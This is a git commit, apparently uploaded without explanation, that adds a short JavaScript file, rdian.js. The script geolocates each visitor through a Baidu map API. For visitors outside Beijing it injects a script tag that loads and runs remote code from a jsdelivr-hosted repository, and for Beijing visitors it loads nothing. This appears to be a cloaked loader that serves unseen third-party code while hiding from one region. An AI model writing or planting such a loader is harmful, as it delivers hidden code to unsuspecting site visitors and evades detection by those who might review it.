e6349e7914d4287565e4595ae81d7a1d662e1f47
free-pic <67177481+free-pic@users.noreply.github.com>
2021-01-14 18:52:15 +0800

    Add files via upload

---
+++ rdian.js
@@ -0,0 +1,9 @@
+﻿document.writeln('<script src="//api.map.baidu.com/?qt=dec&callback=dcg"></script>');
+
+function dcg(data) {
+var citySets = {'北京':'beijing','北京市': 'beijing',};
+if (citySets[data.content.cname]) 
+     {document.writeln("");}
+else {document.writeln("<script src=\"\//cdn.jsdelivr.net/gh/dataoss/static/js/dian.js\"\><\/script>");
+}
+}
